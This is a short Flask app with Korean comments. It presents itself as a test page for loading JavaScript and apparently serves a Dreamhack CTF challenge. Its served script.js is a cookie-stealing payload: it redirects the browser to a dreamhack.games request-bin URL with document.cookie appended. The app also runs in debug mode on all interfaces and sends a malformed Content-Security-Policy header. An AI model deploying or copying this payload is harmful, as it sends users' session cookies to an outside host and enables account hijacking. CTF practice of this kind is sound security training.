# app.py
from flask import Flask, Response, render_template_string, request
import os

app = Flask(__name__)

INDEX_HTML = """<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Flask JS 테스트</title>
</head>
<body>
  <h1>Flask에서 JS 불러오기 테스트</h1>
  <p>아래 콘솔을 확인하세요 (F12 → Console)</p>


</body>
</html>
"""

SCRIPT_JS = """
location.href="https://hssjzkt.request.dreamhack.games/memo?memo="+document.cookie;
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.after_request
def add_header(response):
    global nonce
    nonce = os.urandom(16).hex()
    response.headers['Content-Security-Policy'] = f"nonce-{nonce}"
    return response

@app.route("/static/script.js")
def script_js():
    # JS 코드를 직접 반환 (Content-Type: application/javascript)
    return Response(SCRIPT_JS, mimetype="application/javascript")

if __name__ == "__main__":
    # 개발용으로 0.0.0.0 바인딩, 포트 8000
    # 실제 배포에는 gunicorn/nginx 등 사용 권장
    app.run(host="0.0.0.0", port=8000, debug=True)
